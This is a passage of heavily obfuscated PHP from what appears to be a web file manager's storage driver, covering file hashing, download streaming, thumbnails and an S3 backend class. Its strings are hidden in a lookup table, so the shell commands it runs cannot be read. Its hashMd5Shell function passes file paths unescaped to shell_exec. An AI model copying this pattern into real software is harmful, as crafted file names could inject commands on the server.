$Ğ±Ã–éè); } $¼˜¿ˆÊå .= $this->fileSubstr($ä¶ü¡¸Ó, $¥í…±“Ñ - $Ğ±Ã–éè, $Ğ±Ã–éè); return md5($¼˜¿ˆÊå) . $¥í…±“Ñ; } public static $md5Cache = array(); public function hashMd5($±ÎşÖÍ©) { if (!$±ÎşÖÍ©) { return md5($_SERVER[å¸¿•¶£][12]); } $±ÎşÖÍ© = $this->iconvSystem($±ÎşÖÍ©); if (isset(self::$md5Cache[$±ÎşÖÍ©])) { return self::$md5Cache[$±ÎşÖÍ©]; } self::$md5Cache[$±ÎşÖÍ©] = $this->hashMd5Shell($±ÎşÖÍ©); if (!self::$md5Cache[$±ÎşÖÍ©]) { self::$md5Cache[$±ÎşÖÍ©] = @md5_file($±ÎşÖÍ©); } return self::$md5Cache[$±ÎşÖÍ©]; } private function hashMd5Shell($ûı÷—æ) { $³£»¸Îµ =& $_SERVER[å¸¿•¶£]; if (!$ûı÷—æ) { return md5($³£»¸Îµ[12]); } if (!function_exists($³£»¸Îµ[98])) { return !1; } $áĞÓÈÈí = array($³£»¸Îµ[99], $³£»¸Îµ[100]); $ôŒÊ²Üó = Cache::get($³£»¸Îµ[101]); if (!$ôŒÊ²Üó) { $Û¢ÔÃšü = BASIC_PATH . $³£»¸Îµ[102]; $®¢õÎÇû = md5_file($Û¢ÔÃšü); $ôŒÊ²Üó = $³£»¸Îµ[103]; foreach ($áĞÓÈÈí as $ƒıˆŸéÛ) { $ÓÙíÕ“ = shell_exec($ƒıˆŸéÛ . "\40\x22{$Û¢ÔÃšü}\42"); if ($ÓÙíÕ“ && substr(trim($ÓÙíÕ“), 0, 32) == $®¢õÎÇû) { $ôŒÊ²Üó = $ƒıˆŸéÛ; break; } } Cache::set($³£»¸Îµ[101], $ôŒÊ²Üó, 3600); } if ($ôŒÊ²Üó == $³£»¸Îµ[103]) { return !1; } $ÓÙíÕ“ = shell_exec($ôŒÊ²Üó . "\40\42{$ûı÷—æ}\42"); $ÓÙíÕ“ = str_replace($³£»¸Îµ[104], $³£»¸Îµ[12], $ÓÙíÕ“); return substr($ÓÙíÕ“, 0, 32); } public function link($¯ñıÃ‹) { return $¯ñıÃ‹; } public function fileOut($ºÔî¶, $è¸‰¥…Ö = false, $ÈáÒò¿„ = false, $Ä¹ş™‹î = '') { $¯·Š‘Ğ =& $_SERVER[å¸¿•¶£]; $this->cacheMethod(null, null); if (!$ºÔî¶ || !$this->exist($ºÔî¶)) { show_json(LNG($¯·Š‘Ğ[105]), !1, $ÈáÒò¿„); } $ŸçÙò³ = $this->getType() == $¯·Š‘Ğ[106]; $„øÀÜÏÅ = $GLOBALS[$¯·Š‘Ğ[6]][$¯·Š‘Ğ[89]][$¯·Š‘Ğ[107]][$¯·Š‘Ğ[108]]; $‚ÌæºóÎ = (double) $GLOBALS[$¯·Š‘Ğ[6]][$¯·Š‘Ğ[89]][$¯·Š‘Ğ[107]][$¯·Š‘Ğ[109]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $ã‰òÕ§¡ = $this->infoFull($ºÔî¶); $õœœ÷¾‰ = $ã‰òÕ§¡[$¯·Š‘Ğ[76]]; $¯ƒıĞ‚Õ = gmdate($¯·Š‘Ğ[110], $ã‰òÕ§¡[$¯·Š‘Ğ[85]]); $äÛ‹¯Öã = $ÈáÒò¿„ ? $ÈáÒò¿„ : $this->iconvApp($ã‰òÕ§¡[$¯·Š‘Ğ[32]]); $‘í­£Ô = 0; $ÑŒØÉ­é = $õœœ÷¾‰ - 1; $ÍÛšŞ”‰ = $this->ext($äÛ‹¯Öã); if (in_array($ÍÛšŞ”‰, array($¯·Š‘Ğ[111], $¯·Š‘Ğ[112], $¯·Š‘Ğ[113], $¯·Š‘Ğ[114]))) { $ÍÛšŞ”‰ = $¯·Š‘Ğ[115]; } if (in_array($ÍÛšŞ”‰, array($¯·Š‘Ğ[116]))) { $ÍÛšŞ”‰ = $¯·Š‘Ğ[117]; } if (!$Ä¹ş™‹î) { $Ä¹ş™‹î = md5($¯ƒıĞ‚Õ . $this->hashSimple($ºÔî¶)); } $Ä¹ş™‹î = $¯·Š‘Ğ[118] . $Ä¹ş™‹î . $¯·Š‘Ğ[118]; $šÂÅâ•å = get_file_mime($ÍÛšŞ”‰); $ë¬ûß¹Ì = !0; $ë¬ûß¹Ì = isset($_GET[$¯·Š‘Ğ[119]]) ? !1 : !0; if ($è¸‰¥…Ö === !1 && !mime_support($šÂÅâ•å)) { $šÂÅâ•å = $¯·Š‘Ğ[120]; } header($¯·Š‘Ğ[121]); header($¯·Š‘Ğ[122] . $šÂÅâ•å); $Â¶¢¶™é = rawurlencode($äÛ‹¯Öã); $Â¶¢¶™é = $¯·Š‘Ğ[118] . $Â¶¢¶™é . $¯·Š‘Ğ[123] . $Â¶¢¶™é; if ($è¸‰¥…Ö) { header($¯·Š‘Ğ[124]); header($¯·Š‘Ğ[125] . $Â¶¢¶™é); } else { if ($ë¬ûß¹Ì) { header($¯·Š‘Ğ[126] . $Â¶¢¶™é); } } header($¯·Š‘Ğ[127] . gmdate($¯·Š‘Ğ[110], time() + 3600 * 24 * 30) . $¯·Š‘Ğ[128]); header($¯·Š‘Ğ[129]); header($¯·Š‘Ğ[130]); header($¯·Š‘Ğ[131]); if (isset($_SERVER[$¯·Š‘Ğ[132]]) && strtotime($_SERVER[$¯·Š‘Ğ[132]]) == $ã‰òÕ§¡[$¯·Š‘Ğ[85]]) { header($¯·Š‘Ğ[133], !0, 304); die; } if (isset($_SERVER[$¯·Š‘Ğ[134]]) && $_SERVER[$¯·Š‘Ğ[134]] == $Ä¹ş™‹î) { header($¯·Š‘Ğ[135] . $Ä¹ş™‹î, !0, 304); die; } header($¯·Š‘Ğ[135] . $Ä¹ş™‹î); header($¯·Š‘Ğ[136] . $¯ƒıĞ‚Õ . $¯·Š‘Ğ[128]); header($¯·Š‘Ğ[137] . $äÛ‹¯Öã); header($¯·Š‘Ğ[138]); header($¯·Š‘Ğ[139] . $õœœ÷¾‰); header($¯·Š‘Ğ[140]); if (!$è¸‰¥…Ö && $ÍÛšŞ”‰ == $¯·Š‘Ğ[141]) { if ($õœœ÷¾‰ > 1024 * 1024 * 5) { die; } $º¬÷ŠÍ = $this->getContent($ºÔî¶); $º¬÷ŠÍ = Html::clearSVG($º¬÷ŠÍ); header($¯·Š‘Ğ[142] . strlen($º¬÷ŠÍ)); echo $º¬÷ŠÍ; die; } $±··í‚Ã = strtolower($_SERVER[$¯·Š‘Ğ[143]]); if ($ŸçÙò³ && $±··í‚Ã && $„øÀÜÏÅ) { if (strstr($±··í‚Ã, $¯·Š‘Ğ[144])) { header($¯·Š‘Ğ[145] . $ºÔî¶); } else { if (strstr($±··í‚Ã, $¯·Š‘Ğ[146])) { header($¯·Š‘Ğ[147] . $ºÔî¶); } else { if (strstr($±··í‚Ã, $¯·Š‘Ğ[148])) { header($¯·Š‘Ğ[149] . $ºÔî¶); } } } if ($‚ÌæºóÎ) { header($¯·Š‘Ğ[150] . $‚ÌæºóÎ); } return; } if (isset($_SERVER[$¯·Š‘Ğ[151]])) { if (preg_match($¯·Š‘Ğ[152], $_SERVER[$¯·Š‘Ğ[151]], $†Â‹²ö®)) { $‘í­£Ô = intval($†Â‹²ö®[1]); $‘í­£Ô = $‘í­£Ô <= 0 ? 0 : ($‘í­£Ô >= $ÑŒØÉ­é ? $ÑŒØÉ­é : $‘í­£Ô); if (!empty($†Â‹²ö®[2])) { $å©ç÷åß = intval($†Â‹²ö®[2]); $ÑŒØÉ­é = $å©ç÷åß < $‘í­£Ô ? $‘í­£Ô : ($å©ç÷åß >= $ÑŒØÉ­é ? $ÑŒØÉ­é : $å©ç÷åß); } } header($¯·Š‘Ğ[153]); header("\103\x6f\x6e\164\145\x6e\x74\55\x52\x61\x6e\x67\x65\x3a\40\x62\x79\164\145\x73\40{$‘í­£Ô}\x2d{$ÑŒØÉ­é}\x2f" . $õœœ÷¾‰); } else { header($¯·Š‘Ğ[154]); } header($¯·Š‘Ğ[155]); $áùŠĞ›ã = !0; if ($_SERVER[$¯·Š‘Ğ[156]] == $¯·Š‘Ğ[157] && $õœœ÷¾‰ > 1204 * 1024 * 1024 * 2) { $áùŠĞ›ã = !1; } if ($áùŠĞ›ã) { header($¯·Š‘Ğ[158] . ($ÑŒØÉ­é - $‘í­£Ô + 1)); } if ($_SERVER[$¯·Š‘Ğ[159]] == $¯·Š‘Ğ[160]) { return; } $®Áûİ“¦ = 1024 * 100; $…ãŞïÙ = 0; if ($‚ÌæºóÎ) { $…ãŞïÙ = intval(1000 * 1000 * ($®Áûİ“¦ / $‚ÌæºóÎ)); } while ($‘í­£Ô <= $ÑŒØÉ­é) { $ë¸ˆÔˆí = timeFloat(); check_abort(); $““ˆÕöò = $ÑŒØÉ­é - $‘í­£Ô + 1; if ($““ˆÕöò <= $®Áûİ“¦) { $®Áûİ“¦ = $““ˆÕöò; } echo $this->fileSubstr($ºÔî¶, $‘í­£Ô, $®Áûİ“¦); $‘í­£Ô += $®Áûİ“¦; if ($®Áûİ“¦ == $““ˆÕöò) { $‘í­£Ô = $ÑŒØÉ­é + 1; } if ($…ãŞïÙ) { $ÁÔÑæª÷ = intval(1000 * 1000 * (timeFloat() - $ë¸ˆÔˆí)); $¥Šğ‰Ÿ¿ = $…ãŞïÙ - $ÁÔÑæª÷; if ($¥Šğ‰Ÿ¿ > 5) { usleep($¥Šğ‰Ÿ¿); } } } } public function fileOutServer($ëÌØñ¢ö, $¸ĞÚüÑƒ = false, $¹®’æ¸Ñ = false, $ò´ë ½ = '') { $this->fileOut($ëÌØñ¢ö, $¸ĞÚüÑƒ, $¹®’æ¸Ñ, $ò´ë ½); } public function fileOutLink($ óìä»Ö) { header($_SERVER[å¸¿•¶£][161] . $ óìä»Ö); die; } public function cacheMethod($Í…ªæÕé, $ü¹öğğç, $Ù²Ï£Õ = null) { $ïĞ“ÛïÀ =& $_SERVER[å¸¿•¶£]; static $éÔåæö¢ = array(); $–‘œÂŠÊ = $ü¹öğğç ? ltrim($this->getPathOuter($ü¹öğğç), $ïĞ“ÛïÀ[8]) : $ïĞ“ÛïÀ[12]; $á™åËäÜ = $ïĞ“ÛïÀ[162] . $Í…ªæÕé . $ïĞ“ÛïÀ[163] . rtrim($–‘œÂŠÊ, $ïĞ“ÛïÀ[8]); if (is_null($Í…ªæÕé)) { $éÔåæö¢ = array(); return; } if (is_null($ü¹öğğç)) { foreach ($éÔåæö¢ as $á™åËäÜ => $î‘¸â‹) { if (!strstr($á™åËäÜ, $ïĞ“ÛïÀ[162] . $Í…ªæÕé . $ïĞ“ÛïÀ[164])) { continue; } unset($éÔåæö¢[$á™åËäÜ]); } return; } if (!is_null($Ù²Ï£Õ)) { $éÔåæö¢[$á™åËäÜ] = $Ù²Ï£Õ; return; } $ûı’â· = isset($éÔåæö¢[$á™åËäÜ]) ? $éÔåæö¢[$á™åËäÜ] : null; if (!is_null($ûı’â·)) { return $ûı’â·; } $ûı’â· = $this->{$Í…ªæÕé}($ü¹öğğç); $éÔåæö¢[$á™åËäÜ] = $ûı’â·; return $ûı’â·; } public function cacheMethodInfoSet($û¶÷ù´ , $«ş¶Šäë, $ì½à˜ = false) { $ßİåùƒı =& $_SERVER[å¸¿•¶£]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($ßİåùƒı[165], $û¶÷ù´ , $«ş¶Šäë); $this->cacheMethod($ßİåùƒı[166], $û¶÷ù´ , $«ş¶Šäë ? !1 : !0); if (is_array($ì½à˜)) { $this->cacheMethod($ßİåùƒı[167], $û¶÷ù´ , $ì½à˜); } } public function fileOutImage($“Ş†ó¢§, $üŠĞâ· = 250) { $»²İ«áö =& $_SERVER[å¸¿•¶£]; set_timeout(); if (substr($“Ş†ó¢§, 0, 4) == $»²İ«áö[148]) { $this->fileOutLink($“Ş†ó¢§); } $ìÕ‚ñËç = $this->info($“Ş†ó¢§); $•ÜÏ™¢¿ = $ìÕ‚ñËç[$»²İ«áö[32]]; $«ÈîÁëğ = !1; if (isset($GLOBALS[$»²İ«áö[168]]) && $GLOBALS[$»²İ«áö[168]][$»²İ«áö[84]] == $ìÕ‚ñËç[$»²İ«áö[84]]) { $·¾û™ = $GLOBALS[$»²İ«áö[168]][$»²İ«áö[169]]; if (!$ìÕ‚ñËç[$»²İ«áö[170]]) { $ìÕ‚ñËç[$»²İ«áö[170]] = $GLOBALS[$»²İ«áö[168]]; } if (isset($·¾û™[$»²İ«áö[171]])) { if ($·¾û™[$»²İ«áö[171]] <= $üŠĞâ· && $·¾û™[$»²İ«áö[172]] <= $üŠĞâ·) { $«ÈîÁëğ = !0; } } $•ÜÏ™¢¿ = $ìÕ‚ñËç[$»²İ«áö[170]][$»²İ«áö[32]]; } if ($ìÕ‚ñËç[$»²İ«áö[76]] <= 1024 * 50 || $«ÈîÁëğ || !function_exists($»²İ«áö[173]) || $ìÕ‚ñËç[$»²İ«áö[174]] == $»²İ«áö[175]) { return $this->fileOut($“Ş†ó¢§, !1, $•ÜÏ™¢¿); } if (isset($ìÕ‚ñËç[$»²İ«áö[170]][$»²İ«áö[176]])) { $èÑÇß¿ø = $ìÕ‚ñËç[$»²İ«áö[170]][$»²İ«áö[176]]; } else { if (isset($ìÕ‚ñËç[$»²İ«áö[170]][$»²İ«áö[177]])) { $èÑÇß¿ø = $ìÕ‚ñËç[$»²İ«áö[170]][$»²İ«áö[177]]; } } if (!$èÑÇß¿ø) { $èÑÇß¿ø = md5("{$ìÕ‚ñËç[$»²İ«áö[32]]}\x5f{$ìÕ‚ñËç[$»²İ«áö[84]]}\137{$ìÕ‚ñËç[$»²İ«áö[76]]}\137{$üŠĞâ·}"); } $á¢ÇıÉÄ = "{$èÑÇß¿ø}\x5f{$üŠĞâ·}\56\160\x6e\x67"; if (!($ˆÊçœ”Ñ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $»²İ«áö[178]))) { $Ñ Ãƒ¶ = IO::mkdir(IO_PATH_SYSTEM_TEMP . $»²İ«áö[179]); } else { $Ñ Ãƒ¶ = KodIO::make($ˆÊçœ”Ñ); } if ($ˆÊçœ”Ñ = IO::fileNameExist($Ñ Ãƒ¶, $á¢ÇıÉÄ)) { $‰²™Ù×ë = KodIO::make($ˆÊçœ”Ñ); return IO::fileOut($‰²™Ù×ë, !1, $•ÜÏ™¢¿); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } $‰²™Ù×ë = DATA_THUMB . $á¢ÇıÉÄ; del_file($‰²™Ù×ë); if (!@file_exists($‰²™Ù×ë)) { $åÂµàâÄ = TEMP_FILES; if (!is_dir($åÂµàâÄ)) { mk_dir($åÂµàâÄ); } $ÚìÀÙ„º = $åÂµàâÄ . $èÑÇß¿ø . $»²İ«áö[10] . $ìÕ‚ñËç[$»²İ«áö[174]]; if (!@file_exists($ÚìÀÙ„º)) { $ÚìÀÙ„º = $this->download($“Ş†ó¢§, $ÚìÀÙ„º); } ImageThumb::createThumb($ÚìÀÙ„º, $‰²™Ù×ë, $üŠĞâ·, $üŠĞâ· * 10); } if (!file_exists($‰²™Ù×ë) || filesize($‰²™Ù×ë) < 100) { return @file_exists($ÚìÀÙ„º) ? IO::fileOut($ÚìÀÙ„º) : $this->fileOut($“Ş†ó¢§); } if (!($ŸçËÖì = IO::move($‰²™Ù×ë, $Ñ Ãƒ¶))) { return IO::fileOut($‰²™Ù×ë); } del_file($‰²™Ù×ë); IO::fileOut($ŸçËÖì); } public function fileOutImageServer($€î«ãµ, $ŸÔáÀ¶Œ = 250) { $this->fileOutImage($€î«ãµ, $ŸÔáÀ¶Œ); } public function fileNameAuto($¡ÀÜúÀ, $±Ä¢Ø¼ª, $–‘­Ó÷Ù = REPEAT_RENAME, $…ô†°—Ç = false) { $“ÆÛÎ³ =& $_SERVER[å¸¿•¶£]; $Íí…ºäÖ = $¡ÀÜúÀ === $“ÆÛÎ³[12] ? $±Ä¢Ø¼ª : rtrim($¡ÀÜúÀ, $“ÆÛÎ³[8]) . $“ÆÛÎ³[8] . $±Ä¢Ø¼ª; if ($–‘­Ó÷Ù == REPEAT_REPLACE || !$this->exist($Íí…ºäÖ) || $…ô†°—Ç && $–‘­Ó÷Ù != REPEAT_RENAME_FOLDER) { return $±Ä¢Ø¼ª; } if ($–‘­Ó÷Ù == REPEAT_SKIP) { return !1; } $ÕàÙÎ¡Ğ = $“ÆÛÎ³[10] . get_path_ext($±Ä¢Ø¼ª); $ÕàÙÎ¡Ğ = $ÕàÙÎ¡Ğ == $“ÆÛÎ³[10] || $…ô†°—Ç ? $“ÆÛÎ³[12] : $ÕàÙÎ¡Ğ; $ÆÍ£Ôó“ = 1; $Îôş†Ê† = substr($±Ä¢Ø¼ª, 0, strlen($±Ä¢Ø¼ª) - strlen($ÕàÙÎ¡Ğ)); $øëğğ’Ç = $Îôş†Ê† . "\50{$ÆÍ£Ôó“}\x29{$ÕàÙÎ¡Ğ}"; while ($this->exist(rtrim($¡ÀÜúÀ, $“ÆÛÎ³[8]) . $“ÆÛÎ³[8] . $øëğğ’Ç)) { $øëğğ’Ç = $Îôş†Ê† . "\50{$ÆÍ£Ôó“}\51{$ÕàÙÎ¡Ğ}"; $ÆÍ£Ôó“++; } return $øëğğ’Ç; } private function fileNameAutoList($Ã–Àêç, $« ß·ˆ, $†ªïçÂ™ = false) { $çâÂØ²½ =& $_SERVER[å¸¿•¶£]; $È®£†Ç = $this->listPath($Ã–Àêç, !0); $È®£†Ç = array_merge($È®£†Ç[$çâÂØ²½[82]], $È®£†Ç[$çâÂØ²½[83]]); $ì„ıªĞ = array_to_keyvalue($È®£†Ç, $çâÂØ²½[12], $çâÂØ²½[32]); $šúö¤¼¤ = $çâÂØ²½[10] . get_path_ext($« ß·ˆ); $šúö¤¼¤ = $šúö¤¼¤ == $çâÂØ²½[10] || $†ªïçÂ™ ? $çâÂØ²½[12] : $šúö¤¼¤; $Ü¡êÃ­Õ = substr($« ß·ˆ, 0, strlen($« ß·ˆ) - strlen($šúö¤¼¤)); $şª—õ£ç = $Ü¡êÃ­Õ . "\50\60\x29{$šúö¤¼¤}"; for ($×ºÍÇí = 1; $×ºÍÇí <= count($ì„ıªĞ) + 1; $×ºÍÇí++) { $şª—õ£ç = $Ü¡êÃ­Õ . "\50{$×ºÍÇí}\51{$šúö¤¼¤}"; if (!in_array_not_case($şª—õ£ç, $ì„ıªĞ)) { return $şª—õ£ç; } } return $şª—õ£ç; } public function listAllFiles($š¥‡»Á, $ô‹ŞŞ¹›) { $ù¿Ò‹êŞ =& $_SERVER[å¸¿•¶£]; if (empty($ô‹ŞŞ¹›)) { return array(); } $ãÃ ¾ƒ = array_keys($ô‹ŞŞ¹›); $åš»Ì = array(); $š¥‡»Á = trim($š¥‡»Á, $ù¿Ò‹êŞ[8]); foreach ($ô‹ŞŞ¹› as $µ¨µÀ°½ => $§¤¬éÉ÷) { $¿©‘æâì = ltrim(substr(trim($µ¨µÀ°½, $ù¿Ò‹êŞ[8]), strlen($š¥‡»Á)), $ù¿Ò‹êŞ[8]); if (substr($µ¨µÀ°½, -1) == $ù¿Ò‹êŞ[8]) { $¿©‘æâì = rtrim($¿©‘æâì, $ù¿Ò‹êŞ[8]) . $ù¿Ò‹êŞ[8]; } $åš»Ì = array_merge($åš»Ì, $this->slicePath($¿©‘æâì)); } $”Œò×˜ = array(); foreach (array_unique($åš»Ì) as $Ë¥¦ôåİ) { $£¼·æ×™ = array($ù¿Ò‹êŞ[84] => $this->getPathOuter($ù¿Ò‹êŞ[8] . $š¥‡»Á . $ù¿Ò‹êŞ[8] . $Ë¥¦ôåİ), $ù¿Ò‹êŞ[75] => 1, $ù¿Ò‹êŞ[76] => 0); if (substr($Ë¥¦ôåİ, -1) != $ù¿Ò‹êŞ[8]) { $£¼·æ×™[$ù¿Ò‹êŞ[75]] = 0; $ÀŒŠô ´ = $this->getPath($š¥‡»Á . $ù¿Ò‹êŞ[8] . $Ë¥¦ôåİ); if (isset($ô‹ŞŞ¹›[$ÀŒŠô ´])) { $”©¢»³ø = $ô‹ŞŞ¹›[$ÀŒŠô ´]; if (isset($”©¢»³ø[$ù¿Ò‹êŞ[76]])) { $£¼·æ×™[$ù¿Ò‹êŞ[76]] = intval($”©¢»³ø[$ù¿Ò‹êŞ[76]]); } if (isset($”©¢»³ø[$ù¿Ò‹êŞ[180]])) { $£¼·æ×™[$ù¿Ò‹êŞ[85]] = intval($”©¢»³ø[$ù¿Ò‹êŞ[180]]); } } } $”Œò×˜[] = $£¼·æ×™; } return $”Œò×˜; } public function slicePath($¯„¯ÀÙâ) { $¼ñÊÉ« =& $_SERVER[å¸¿•¶£]; $Øøş±²÷ = explode($¼ñÊÉ«[8], trim($¯„¯ÀÙâ, $¼ñÊÉ«[8])); $—— ù¹‰ = 0; do { ++$—— ù¹‰; $Î¡Êô¾¥[] = implode($¼ñÊÉ«[8], array_slice($Øøş±²÷, 0, $—— ù¹‰)) . $¼ñÊÉ«[8]; } while ($—— ù¹‰ < count($Øøş±²÷)); $Î¡Êô¾¥[count($Øøş±²÷) - 1] = $¯„¯ÀÙâ; return $Î¡Êô¾¥; } public function getHost() { $õ†÷·›› =& $_SERVER[å¸¿•¶£]; $çÃÆø£Î = parse_url(trim($this->domain, $õ†÷·››[8])); $à’ª¯â = isset($çÃÆø£Î[$õ†÷·››[181]]) ? $çÃÆø£Î[$õ†÷·››[181]] : http_type(); $ŒœçÖ¾ = isset($çÃÆø£Î[$õ†÷·››[182]]) ? $çÃÆø£Î[$õ†÷·››[182]] : $çÃÆø£Î[$õ†÷·››[84]]; if (isset($çÃÆø£Î[$õ†÷·››[183]])) { $ŒœçÖ¾ .= $õ†÷·››[4] . $çÃÆø£Î[$õ†÷·››[183]]; } return $à’ª¯â . $õ†÷·››[184] . $ŒœçÖ¾; } public function pathEncode($Óâ–£…) { $şá­¸İ† =& $_SERVER[å¸¿•¶£]; return str_replace($şá­¸İ†[185], $şá­¸İ†[8], rawurlencode($Óâ–£…)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\x34"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($Ä…Òä°) { set_timeout(); require_once SDK_DIR . $_SERVER[å¸¿•¶£][186]; parent::__construct(); $this->_init($Ä…Òä°); } public function _init($Š¥‡‚ş) { $this->config = $Š¥‡‚ş; foreach ($Š¥‡‚ş as $±­Û™É  => $¦ù±¤¬Ş) { if (isset($this->{$±­Û™É })) { $this->{$±­Û™É } = $¦ù±¤¬Ş; } } $this->endpoint = $Š¥‡‚ş[$_SERVER[å¸¿•¶£][187]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($óâ™‹ = "\x76\64") { $this->signVer = $óâ™‹; $this->client->setSignatureVersion($óâ™‹); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { $™ŸÖñ­à =& $_SERVER[å¸¿•¶£]; $Å‹’ñ£³ = $this->getBucketCors(); if (!$Å‹’ñ£³ || !is_array($Å‹’ñ£³)) { return !1; } if ($Å‹’ñ£³[$™ŸÖñ­à[188]] != $™ŸÖñ­à[189] || $Å‹’ñ£³[$™ŸÖñ­à[190]] != $™ŸÖñ­à[189]) { return !1; } $‹½›ßï  = array_map($™ŸÖñ­à[191], $Å‹’ñ£³[$™ŸÖñ­à[192]]); if (!is_array($‹½›ßï )) { $‹½›ßï  = array(); } $î¿›éåû = array($™ŸÖñ­à[193], $™ŸÖñ­à[194], $™ŸÖñ­à[195], $™ŸÖñ­à[196], $™ŸÖñ­à[197]); $‡‹É‘É“ = array_diff($î¿›éåû, $‹½›ßï ); return empty($‡‹É‘É“); } public function mkfile($ôïï£õ™, $‰Ô¼·ê = '', $­òÄ¬—Ó = REPEAT_RENAME) { $¬¤ìœëö = $this->setContent($ôïï£õ™, $‰Ô¼·ê); if ($¬¤ìœëö !== !1) { return $this->getPathOuter($ôïï£õ™); } return !1; } public function mkdir($û°…îŸ·, $ˆ¶Ó²í­ = REPEAT_SKIP) { $¹í¢ßš =& $_SERVER[å¸¿•¶£]; if (empty($û°…îŸ·) && $û°…îŸ· !== $¹í¢ßš[198]) { return !1; } if ($ˆ¶Ó²í­ && $this->_isFolder($û°…îŸ·)) { return $this->getPathOuter($û°…îŸ·); } $¶ÚÓôÜì = $this->setContent($û°…îŸ·, $¹í¢ßš[12], !0); if ($¶ÚÓôÜì !== !1) { return $this->getPathOuter($û°…îŸ·); } return !1; } public function copyFile($Ü±»«Äê, $±¾µëçª, $îğ®Ê‡ø = array()) { $ñŠ…²ùš =& $_SERVER[å¸¿•¶£]; $°³ÙĞÂ› = $this->objectMeta($Ü±»«Äê); if (!$°³ÙĞÂ›) { return !1; } if ($°³ÙĞÂ›[$ñŠ…²ùš[76]] <= 1024 * 1024 * 200) { $ô½ÅèóÚ = $this->client->copyObject($this->bucket, $Ü±»«Äê, $this->bucket, $±¾µëçª, $ñŠ…²ùš[199], $îğ®Ê‡ø); } else { $ô½ÅèóÚ = $this->client->multiCopyObject($this->bucket, $Ü±»«Äê, $this->bucket, $±¾µëçª, $îğ®Ê‡ø); } $ô½ÅèóÚ = $ô½ÅèóÚ ? $this->getPathOuter($±¾µëçª) : !1; return $ô½ÅèóÚ; } public function moveFile($–¸´”˜¢, $Áâ¼’Ç) { if ($this->copyFile($–¸´”˜¢, $Áâ¼’Ç)) { $this->delFile($–¸´”˜¢); return $this->getPathOuter($Áâ¼’Ç); } return !1; } public function delFile($¬¼±ì”Ñ) { return $this->client->deleteObject($this->bucket, $¬¼±ì”Ñ); } public function delFolder($Üã««´) { $Ğô÷¡ƒ¢ =& $_SERVER[å¸¿•¶£]; if (!$this->exist($Üã««´)) { return !0; } $this->listItemCache = !1; $­Ë«ª = $this->fileList($Üã««´); $this->listItemCache = !0; $ˆ¶ÅÜğï = trim($Üã««´, $Ğô÷¡ƒ¢[8]) . $Ğô÷¡ƒ¢[8]; if (!empty($Üã««´) && $Üã««´ !== $Ğô÷¡ƒ¢[198] && !in_array($ˆ¶ÅÜğï, $­Ë«ª[$Ğô÷¡ƒ¢[82]])) { $­Ë«ª[$Ğô÷¡ƒ¢[82]][] = $ˆ¶ÅÜğï; } $êë•Ø“ã = $this->delByBatch($­Ë«ª[$Ğô÷¡ƒ¢[83]]); if (!$êë•Ø“ã) { return !1; } $êë•Ø“ã = $this->delByBatch($­Ë«ª[$Ğô÷¡ƒ¢[82]]); if (!$êë•Ø“ã) { return !1; } return $this->delFile($ˆ¶ÅÜğï); } private function delByBatch($•¡îÁ›) { foreach (array_chunk($•¡îÁ›, 1000) as $ãñÎ±âô) { $é¢¥ƒÒ­ = $this->client->deleteObjects($this->bucket, $ãñÎ±âô); if (!$é¢¥ƒÒ­) { return !1; } } return !0; } public function rename($‰¿Ç‰£¯, $ÒÇóÌ“Ñ) { return $this->renameObject($‰¿Ç‰£¯, $ÒÇóÌ“Ñ); } public function listPath($ÄŒ°Ìãä, $¶³Ç±Îá = false) { $ôƒÃäÄç =& $_SERVER[å¸¿•¶£]; $û²¢ŒÃ = $this->fileList($ÄŒ°Ìãä, $ôƒÃäÄç[8], !0); foreach ($û²¢ŒÃ[$ôƒÃäÄç[82]] as $Ù“‘‹‘ö => $ÇÁÓ¯×ñ) { $û²¢ŒÃ[$ôƒÃäÄç[82]][$Ù“‘‹‘ö] = $this->folderInfo($ÇÁÓ¯×ñ, $¶³Ç±Îá, $ÇÁÓ¯×ñ); } foreach ($û²¢ŒÃ[$ôƒÃäÄç[83]] as $Ù“‘‹‘ö => $ÇÁÓ¯×ñ) { $û²¢ŒÃ[$ôƒÃäÄç[83]][$Ù“‘‹‘ö] = $this->fileInfo($ÇÁÓ¯×ñ[$ôƒÃäÄç[32]], $¶³Ç±Îá, $ÇÁÓ¯×ñ); } return $û²¢ŒÃ; } protected function infoChildren($Òú¢ò’–, &$Õí¢œÊ­) { $ü·²Ş®– =& $_SERVER[å¸¿•¶£]; $–ÒõöØ = $this->fileList($Òú¢ò’–, $ü·²Ş®–[12], !0); $Õí¢œÊ­[$ü·²Ş®–[78]] += count($–ÒõöØ[$ü·²Ş®–[82]]); $Õí¢œÊ­[$ü·²Ş®–[77]] += count($–ÒõöØ[$ü·²Ş®–[83]]); foreach ($–ÒõöØ[$ü·²Ş®–[83]] as $”­™˜Ø) { if (!$”­™˜Ø || !$”­™˜Ø[$ü·²Ş®–[76]]) { continue; } $Õí¢œÊ­[$ü·²Ş®–[76]] += $”­™˜Ø[$ü·²Ş®–[76]]; } } private function fileInfo($Ì†›»æŞ, $¢­¶‹é­ = false, $°ƒïÏÕµ = array()) { $Ó“§ñÊ =& $_SERVER[å¸¿•¶£]; $¬ÃÒÜàÈ = array($Ó“§ñÊ[32] => $this->pathThis($Ì†›»æŞ), $Ó“§ñÊ[84] => $this->getPathOuter($Ì†›»æŞ), $Ó“§ñÊ[33] => $Ó“§ñÊ[200], $Ó“§ñÊ[174] => $this->ext($Ì†›»æŞ), $Ó“§ñÊ[76] => isset($°ƒïÏÕµ[$Ó“§ñÊ[76]]) ? $°ƒïÏÕµ[$Ó“§ñÊ[76]] : 0); if ($¢­¶‹é­) { return $¬ÃÒÜàÈ; } $¬ÃÒÜàÈ[$Ó“§ñÊ[201]] = $¬ÃÒÜàÈ[$Ó“§ñÊ[85]] = 0; $¬ÃÒÜàÈ[$Ó“§ñÊ[202]] = 